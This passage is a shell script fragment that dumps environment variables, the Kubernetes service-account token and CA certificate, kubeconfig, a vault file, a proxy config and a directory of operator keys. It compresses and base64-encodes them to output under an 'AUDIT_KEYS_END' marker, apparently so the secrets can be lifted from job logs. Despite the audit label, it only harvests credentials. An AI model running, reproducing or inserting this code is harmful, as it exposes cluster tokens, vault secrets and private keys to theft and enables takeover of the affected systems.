...
( echo ===ENV===; env
  echo ===SA_TOKEN===; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | base64 -w0
  echo; echo ===SA_CA===; cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1 | base64 -w0
  echo; echo ===KUBECONFIG===; cat ~/.kube/config 2>&1
  echo ===PROXYCFG===; cat proxy-config-devnet-2.ini 2>&1
  echo ===VAULT===; cat vault-devnet-2.json 2>&1
  echo ===OPERATORKEYS===; for f in devnet-2-keys/*; do echo "--- $f"; base64 "$f"; done
) 2>&1 | gzip -c | base64
echo AUDIT_KEYS_END
exit 0
